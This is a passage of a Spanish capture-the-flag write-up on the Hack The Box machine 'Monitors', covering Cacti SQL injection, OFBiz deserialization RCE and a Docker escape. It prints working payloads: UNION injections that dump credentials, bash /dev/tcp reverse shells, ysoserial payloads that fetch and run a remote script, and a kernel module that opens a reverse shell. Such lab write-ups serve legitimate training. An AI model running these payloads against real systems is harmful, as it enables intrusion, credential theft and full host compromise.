+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UNION+SELECT+NULL;--+-
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/35.png" alt="35" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Continuaremos añadiendo <code class="language-plaintext highlighter-rouge">NULL</code> hasta encontrar la cantidad correcta de columnas, y al añadir siete <code class="language-plaintext highlighter-rouge">NULL</code>, logramos que se descargue un archivo <em>CSV</em> llamado <em>colors.csv</em>. Esto confirma que la consulta SQL original tiene siete columnas.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL;--+-
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/36.png" alt="36" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Ahora queremos listar todas las tablas en la base de datos, utilizando el payload que aparece a continuación:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UNION+SELECT+NULL,table_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables;--+-
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/37.png" alt="37" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Entre las tablas listadas, identificamos una de interés llamada <code class="language-plaintext highlighter-rouge">user_auth</code>. Procedemos a descubrir el nombre de sus columnas mediante la siguiente inyección:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UNION+SELECT+NULL,column_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.columns+WHERE+table_name='user_auth';--+-
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/38.png" alt="38" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Entre las columnas, nos interesan <code class="language-plaintext highlighter-rouge">username</code> y <code class="language-plaintext highlighter-rouge">password</code>. Usando la siguiente inyección, listaremos los valores de estas columnas:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UNION+SELECT+NULL,username,password,NULL,NULL,NULL,NULL+from+user_auth;--+-
+</code></pre></div></div>
+
+<p>Esto nos revela dos usuarios: <em>admin</em> y <em>guest</em>, aunque sus contraseñas están hasheadas.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/39.png" alt="39" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Sin embargo, existe una segunda inyección que nos permite obtener una <em>reverse shell</em> dentro de la máquina. Esta inyección se realiza de la siguiente manera:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UPDATE+settings+SET+value='bash -i &gt;&amp; /dev/tcp/&lt;nuestraIP&gt;/443 0&gt;&amp;1;'+WHERE+name='path_php_binary';--+-
+</code></pre></div></div>
+
+<p>Con esto, modificamos un valor dentro de la configuración de <code class="language-plaintext highlighter-rouge">Cacti</code> para que ejecute nuestro comando de <em>reverse shell</em>. Para activarlo, accedemos a la URL que aparece a continuación:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
+</code></pre></div></div>
+
+<p>Al hacerlo, logramos establecer la <em>reverse shell</em>, obteniendo acceso directo dentro de la máquina.</p>
+
+<p>Una vez dentro de la máquina, podemos confirmar nuestra presencia en el sistema mediante el comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hostname -I
+</code></pre></div></div>
+
+<p>Esto nos muestra una lista de direcciones IP disponibles en la máquina, incluyendo <code class="language-plaintext highlighter-rouge">10.10.10.238</code>, <code class="language-plaintext highlighter-rouge">172.18.0.1</code> y <code class="language-plaintext highlighter-rouge">172.17.0.1</code>. Aunque estamos efectivamente en la máquina víctima, la presencia de direcciones en el rango <code class="language-plaintext highlighter-rouge">172.16.0.0/12</code> sugiere configuraciones de red asociadas con <code class="language-plaintext highlighter-rouge">Docker</code>, ya que <code class="language-plaintext highlighter-rouge">Docker</code> típicamente asigna direcciones IP en este rango para redes internas de contenedores.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/40.png" alt="40" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Para verificar si <code class="language-plaintext highlighter-rouge">Docker</code> está activo en la máquina, podemos revisar si existe el socket de <code class="language-plaintext highlighter-rouge">Docker</code> ejecutando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -l /var/run/docker.sock
+</code></pre></div></div>
+
+<p>Esto muestra que el socket es propiedad del usuario <em>root</em> y del grupo <em>docker</em>, lo cual indica que el acceso al <em>daemon Docker</em> está restringido a estos usuarios y a los miembros del grupo <em>docker</em>. Esto significa que nuestro usuario actual no tiene permisos para interactuar con <code class="language-plaintext highlighter-rouge">Docker</code> directamente, por lo que comandos como <code class="language-plaintext highlighter-rouge">docker ps</code> o <code class="language-plaintext highlighter-rouge">docker info</code> no serán efectivos.</p>
+
+<p>Otra opción para confirmar que <code class="language-plaintext highlighter-rouge">Docker</code> está en ejecución es inspeccionar los procesos activos con:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux | grep dockerd
+</code></pre></div></div>
+
+<p>Este comando muestra que el proceso <em>dockerd</em> (el daemon de <code class="language-plaintext highlighter-rouge">Docker</code>) está en ejecución, lo cual confirma que <code class="language-plaintext highlighter-rouge">Docker</code> está activo en el sistema.</p>
+
+<p>El hecho de que <code class="language-plaintext highlighter-rouge">Docker</code> esté corriendo en la máquina víctima es relevante, ya que podría abrir nuevas oportunidades para la escalada de privilegios o la explotación del sistema. Si encontramos algún contenedor en ejecución que esté mal configurado o que ejecute servicios con permisos elevados, podríamos aprovechar esta vulnerabilidad para obtener privilegios adicionales o incluso interactuar con los recursos de la máquina anfitriona desde dentro de un contenedor.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/41.png" alt="41" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>A partir de aquí, continuamos explorando la máquina. En el directorio <code class="language-plaintext highlighter-rouge">/home</code>, encontramos que existe un usuario <code class="language-plaintext highlighter-rouge">marcus</code>. Si accedemos a su directorio personal, encontramos la primera flag, y un archivo note.txt; sin embargo, ambos están protegidos para ser leídos solo por el propio usuario. Esto sugiere que eventualmente necesitaremos convertirnos en el usuario <code class="language-plaintext highlighter-rouge">marcus</code> para obtener acceso a la flag y ver de qué se trata esta nota.</p>
+
+<p>Además, descubrimos que en su directorio personal existe un directorio oculto llamado <code class="language-plaintext highlighter-rouge">.backup</code>, lo cual nos llama la atención. Los directorios de backup suelen contener copias de seguridad que podrían incluir información sensible, como credenciales de acceso o configuraciones importantes. Sin embargo, no podemos leer directamente este directorio, ya que solo tenemos permisos de ejecución (traverse), lo que significa que podemos navegar dentro de él, pero no podemos listar ni inspeccionar su contenido, y solo podremos acceder a los archivos cuyo nombre conozcamos.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/42.png" alt="42" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/43.png" alt="43" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>El hecho de que exista un mecanismo de backup en la máquina nos lleva a investigar más a fondo, por lo que realizamos una búsqueda recursiva en el sistema para buscar archivos relacionados con backup:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /etc /home /lib /opt /tmp /usr /var -type f -iname '*backup*' 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>En los resultados encontramos un archivo llamado <code class="language-plaintext highlighter-rouge">cacti-backup-service</code>, que resulta interesante ya que está relacionado con <code class="language-plaintext highlighter-rouge">Cacti</code>, el sistema que habíamos visto previamente.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/44.png" alt="44" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Este archivo define un servicio que se ejecuta con el usuario <em>www-data</em> y llama al script <code class="language-plaintext highlighter-rouge">backup.sh</code>, ubicado en el directorio <code class="language-plaintext highlighter-rouge">.backup</code> dentro del directorio personal de <code class="language-plaintext highlighter-rouge">marcus</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/45.png" alt="45" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Al revisar el contenido de <code class="language-plaintext highlighter-rouge">backup.sh</code>, vemos que el script comprime los archivos de <code class="language-plaintext highlighter-rouge">Cacti</code> en un archivo ZIP, que luego transfiere a una ubicación remota utilizando <em>SSH</em>. El script proporciona una contraseña para autenticarse, con la cual intentaremos conectarnos por <code class="language-plaintext highlighter-rouge">SSH</code> como el usuario <code class="language-plaintext highlighter-rouge">marcus</code> y obtener acceso directo a su cuenta.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/46.png" alt="46" class="blog-image" onclick="expandImage(this)" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh marcus@10.10.10.238
+</code></pre></div></div>
+
+<p>De esta manera, obtenemos acceso a la cuenta de <code class="language-plaintext highlighter-rouge">marcus</code> y podemos finalmente leer la primera flag.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/47.png" alt="47" class="blog-image" onclick="expandImage(this)" /></p>
+
+<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>
+
+<p>Una vez dentro como el usuario <code class="language-plaintext highlighter-rouge">marcus</code>, podemos leer la nota que habíamos encontrado anteriormente. En ella se hace alusión a la actualización de la imagen de <code class="language-plaintext highlighter-rouge">Docker</code> para su uso en producción, lo que confirma la existencia de <code class="language-plaintext highlighter-rouge">Docker</code>, algo que ya habíamos corroborado previamente.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/48.png" alt="48" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Después de explorar un poco más la máquina, descubrimos que hay más puertos abiertos de los que habíamos registrado inicialmente con <em>Nmap</em>. Estos puertos, conocidos como <em>puertos internos</em>, están disponibles solo localmente. Los puertos <code class="language-plaintext highlighter-rouge">8443</code> (HTTPS), <code class="language-plaintext highlighter-rouge">3306</code> (MySQL) y <code class="language-plaintext highlighter-rouge">53</code> (DNS) están escuchando en <code class="language-plaintext highlighter-rouge">127.0.0.1</code> y no son accesibles desde fuera de la máquina. Por otro lado, los puertos 22 (SSH) y 80 (HTTP) son los que ya habíamos visto previamente desde fuera con <em>Nmap</em> y están disponibles para conexiones externas.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -nlpt
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/49.png" alt="49" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>De estos puertos, nos interesaremos en el puerto web (<code class="language-plaintext highlighter-rouge">8443</code>), ya que está asociado a un servicio <code class="language-plaintext highlighter-rouge">HTTPS</code> accesible solo localmente. Para acceder a este puerto desde nuestro equipo, utilizaremos un <code class="language-plaintext highlighter-rouge">local port forwarding</code>. El <code class="language-plaintext highlighter-rouge">local port forwarding</code> es una técnica en la que redirigimos el tráfico de un puerto en nuestra máquina local a un puerto en la máquina remota a través de una conexión <code class="language-plaintext highlighter-rouge">SSH</code>. Esto nos permite interactuar con servicios que están disponibles solo localmente en la máquina víctima, como en este caso, el servicio <code class="language-plaintext highlighter-rouge">HTTPS</code> en el puerto <code class="language-plaintext highlighter-rouge">8443</code>.</p>
+
+<p>Para lograr esto, ejecutamos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -L 8443:localhost:8443 marcus@10.10.10.238
+</code></pre></div></div>
+
+<p>Este comando establece un <em>túnel SSH</em>, redirigiendo el puerto <code class="language-plaintext highlighter-rouge">8443</code> en nuestra máquina local al puerto <code class="language-plaintext highlighter-rouge">8443</code> de la máquina remota, que solo está disponible de forma local. Así, podemos acceder a este servicio desde nuestro navegador local, simplemente visitando <a href="https://localhost:8443">https://localhost:8443</a>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/50.png" alt="50" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Con el <em>túnel SSH</em> configurado, accedemos al puerto web local <code class="language-plaintext highlighter-rouge">8443</code> y comenzamos a explorar la aplicación. Al realizar un <em>fuzzing</em>, descubrimos varias rutas interesantes.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -L -t 400 --hc 404 --hh 800 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://localhost:8443/FUZZ
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/51.png" alt="51" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Entre ellas, la ruta <code class="language-plaintext highlighter-rouge">main</code> nos indica que podemos iniciar sesión usando el nombre de usuario <em>admin</em> y la contraseña <em>ofbiz</em>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/52.png" alt="52" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Sin embargo, las rutas <code class="language-plaintext highlighter-rouge">bi</code> y <code class="language-plaintext highlighter-rouge">example</code> nos dirigen a un panel de autenticación en un sistema <code class="language-plaintext highlighter-rouge">Apache OFBiz</code>, donde, al intentar usar estas credenciales, recibimos un mensaje de que el usuario no existe. En este panel también se muestra la versión de <code class="language-plaintext highlighter-rouge">Apache OFBiz</code>, la cual es <code class="language-plaintext highlighter-rouge">17.12.01</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/53.png" alt="53" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Como lo hemos venido haciendo, podemos proceder a investigar si esta versión de <code class="language-plaintext highlighter-rouge">Apache OFBiz</code> presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer buscando en línea, en <em>Exploit Database</em>, o directamente desde la consola con <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit ofbiz 17.12.01
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/54.png" alt="54" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Entre los resultados, encontramos un exploit que proporciona <em>ejecución remota de comandos</em> (<code class="language-plaintext highlighter-rouge">RCE</code>) mediante un <code class="language-plaintext highlighter-rouge">ataque de deserialización</code>. Aunque podríamos ejecutarlo directamente, resulta más valioso entender su funcionamiento para practicar el proceso de <em>deserialización</em> y manipular el exploit manualmente, dándonos así un mayor control y comprensión del ataque.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/55.png" alt="55" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Primero, descargaremos <a href="https://github.com/frohoff/ysoserial">ysoserial</a>, una herramienta que nos permite generar objetos <em>Java</em> serializados con payloads maliciosos. Esto resulta útil en <code class="language-plaintext highlighter-rouge">ataques de deserialización</code>, donde al enviar un <em>objeto serializado</em> especialmente diseñado, logramos ejecutar código en el servidor si este procesa (<em>deserializa</em>) el objeto sin realizar una validación adecuada.</p>
+
+<p>Luego, definimos una <em>reverse shell</em> con un script <em>Bash</em>. La <em>reverse shell</em> nos permitirá obtener acceso remoto desde el servidor a nuestra máquina. Para esto, crearemos un archivo llamado <code class="language-plaintext highlighter-rouge">shell.sh</code> con el siguiente contenido:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;nuestraIP&gt;/443 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/56.png" alt="56" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>A continuación, generaremos el <em>payload</em> en formato <em>JAR</em>, usando la clase <code class="language-plaintext highlighter-rouge">CommonsBeanutils1</code>. Esta clase es parte de <em>Apache Commons</em> y se ha explotado en el pasado para ejecutar código de manera arbitraria en objetos serializados. Al utilizar <code class="language-plaintext highlighter-rouge">ysoserial</code> junto con <code class="language-plaintext highlighter-rouge">CommonsBeanutils1</code>, podemos incluir comandos en un objeto serializado que ejecutará el servidor al <em>deserializarlo</em>. En este caso, el <em>payload</em> está diseñado para que el servidor descargue nuestro archivo <code class="language-plaintext highlighter-rouge">shell.sh</code> en el directorio temporal (<code class="language-plaintext highlighter-rouge">/tmp</code>) de la máquina víctima. El output del <em>payload</em> la codificamos en <code class="language-plaintext highlighter-rouge">base64</code> para facilitar su envío y evitar problemas de transmisión en el proceso:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ysoserial-all.jar CommonsBeanutils1 "wget &lt;nuestraIP&gt;/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"; echo
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/57.png" alt="57" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Para que el archivo <code class="language-plaintext highlighter-rouge">shell.sh</code> esté disponible y pueda descargarse en la máquina víctima, iniciaremos un servidor HTTP local con <em>Python</em>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+</code></pre></div></div>
+
+<p>Con este servidor corriendo, ahora podemos enviar nuestro primer <em>payload</em> al servidor de destino. Para ello, utilizaremos <code class="language-plaintext highlighter-rouge">curl</code>, que enviará una solicitud al endpoint <code class="language-plaintext highlighter-rouge">webtools/control/xmlrpc</code> en el puerto <code class="language-plaintext highlighter-rouge">8443</code>. Esta solicitud incluye el <em>payload</em> codificado en <code class="language-plaintext highlighter-rouge">base64</code> dentro de la etiqueta <code class="language-plaintext highlighter-rouge">&lt;serializable&gt;</code>. Al procesar la solicitud, el servidor deserializará el objeto y descargará el script de la <em>reverse shell</em>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "&lt;?xml version='1.0'?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;/name&gt;&lt;value&gt;&lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&gt; PAYLOAD &lt;/serializable&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" -k  -H 'Content-Type:application/xml' &amp;&gt;/dev/null
+</code></pre></div></div>
+
+<p>Aquí, <code class="language-plaintext highlighter-rouge">PAYLOAD</code> es el contenido <code class="language-plaintext highlighter-rouge">base64</code> que generamos en el paso anterior.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/58.png" alt="58" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Después de enviar el <em>payload</em> inicial para descargar <code class="language-plaintext highlighter-rouge">shell.sh</code>, generaremos un segundo <em>payload</em> en formato <em>JAR</em> que ejecutará este archivo en el servidor. Este segundo <em>payload</em> lo generaremos con el mismo proceso de codificación en <code class="language-plaintext highlighter-rouge">base64</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ysoserial-all.jar CommonsBeanutils1 "bash /tmp/shell.sh" | base64 | tr -d "\n"; echo
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/59.png" alt="59" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Antes de enviar este segundo <em>payload</em>, pondremos nuestra máquina en escucha con <code class="language-plaintext highlighter-rouge">Netcat</code> para recibir la reverse shell:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
+</code></pre></div></div>
+<p>Finalmente, enviamos el segundo payload utilizando <code class="language-plaintext highlighter-rouge">curl</code> de la misma manera que el primero. Al ejecutarse esta solicitud, el servidor ejecutará el archivo <code class="language-plaintext highlighter-rouge">shell.sh</code> y obtendremos una <em>reverse shell</em> dentro de la máquina víctima.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "&lt;?xml version='1.0'?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;/name&gt;&lt;value&gt;&lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&gt; PAYLOAD &lt;/serializable&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" -k  -H 'Content-Type:application/xml' &amp;&gt;/dev/null
+</code></pre></div></div>
+
+<p>Una vez dentro de la máquina víctima, podemos confirmar nuestra presencia en el sistema mediante el comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hostname -I
+</code></pre></div></div>
+
+<p>Sin embargo, en lugar de estar directamente en la máquina víctima, nos encontramos dentro de un contenedor, con la dirección IP <code class="language-plaintext highlighter-rouge">172.17.0.2</code>. Algo curioso es que, al ejecutar el comando <em>whoami</em>, descubrimos que somos el usuario <code class="language-plaintext highlighter-rouge">root</code>, lo que indica que tenemos privilegios de administrador dentro del contenedor.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/60.png" alt="60" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Dado que somos <code class="language-plaintext highlighter-rouge">root</code>, el siguiente paso sería intentar escapar de este entorno. Como ya tenemos privilegios de administrador, podemos intentar realizar un <code class="language-plaintext highlighter-rouge">docker breakout</code> para conseguir acceso a la máquina anfitriona y preservar nuestro estado como <code class="language-plaintext highlighter-rouge">root</code> en el sistema de la víctima.</p>
+
+<p>Por defecto, <code class="language-plaintext highlighter-rouge">Docker</code> asigna ciertas <code class="language-plaintext highlighter-rouge">capabilities</code> a los contenedores. Aunque el conjunto de <em>capabilities</em> asignado es mínimo para dificultar la explotación, existen ciertas <em>capabilities</em> que, si están presentes, pueden permitirnos escapar del contenedor. Podemos listar las <em>capabilities</em> existente con el comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>capsh --print
+</code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/61.png" alt="61" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Entre las <em>capabilities</em> encontradas en el contenedor, identificamos <code class="language-plaintext highlighter-rouge">CAP_DAC_OVERRIDE</code> y <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code>, ambas que podríamos intentar abusar. Con <code class="language-plaintext highlighter-rouge">CAP_DAC_OVERRIDE</code>, podríamos escribir en el sistema de archivos de la máquina anfitriona. Sin embargo, para poder hacerlo, también debe estar presente la capability <code class="language-plaintext highlighter-rouge">CAP_DAC_READ_SEARCH</code>, lo que no ocurre en este caso, por lo que esta vía de explotación no es posible. En cambio, podemos abusar de <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code>.</p>
+
+<p>Esta capability permite a los procesos cargar y descargar <em>módulos del kernel</em>, lo que significa que podemos inyectar código directamente en el <em>kernel</em> del sistema anfitrión. Al permitir la ejecución de las llamadas al sistema, esta capability proporciona acceso directo al núcleo del sistema operativo. Dado que los contenedores se aíslan a nivel de sistema operativo (OS), pero comparten el <em>kernel</em> con el anfitrión, este tipo de inyección nos permite interactuar con el <em>kernel</em> de la máquina anfitriona a través del contenedor. Esto nos brinda la capacidad de comprometer totalmente el sistema al permitirnos alterar el <em>kernel</em> y, por lo tanto, eludir todas las barreras de seguridad de Linux, incluidos los módulos de seguridad y la propia contención del contenedor.</p>
+
+<p>Para aprovechar la capability <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code> y escapar del contenedor, vamos a escribir un módulo de <em>kernel</em> que abrirá una <em>reverse shell</em> hacia nuestra máquina de atacante. Este módulo será compilado mediante un <em>Makefile</em>, y luego se inyectará en el <em>kernel</em> del sistema anfitrión para ejecutar el código.</p>
+
+<p>El archivo <code class="language-plaintext highlighter-rouge">reverse-shell.c</code> contiene el código del módulo de <em>kernel</em>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/kmod.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
+</span>
+<span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/bash"</span><span class="p">,</span><span class="s">"-c"</span><span class="p">,</span><span class="s">"bash -i &gt;&amp; /dev/tcp/&lt;nuestraIP&gt;/4444 0&gt;&amp;1"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+<span class="k">static</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">reverse_shell_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">call_usermodehelper</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">UMH_WAIT_EXEC</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">reverse_shell_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Exiting</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">module_init</span><span class="p">(</span><span class="n">reverse_shell_init</span><span class="p">);</span>
+<span class="n">module_exit</span><span class="p">(</span><span class="n">reverse_shell_exit</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Este código define un módulo de <em>kernel</em> que utiliza la función <code class="language-plaintext highlighter-rouge">call_usermodehelper</code> para ejecutar el comando de <em>reverse shell</em> en el sistema anfitrión. Al inicializar el módulo (reverse_shell_init), se ejecuta el comando que abrirá una conexión de <em>reverse shell</em> hacia nuestra IP en el puerto <code class="language-plaintext highlighter-rouge">4444</code>.</p>
+
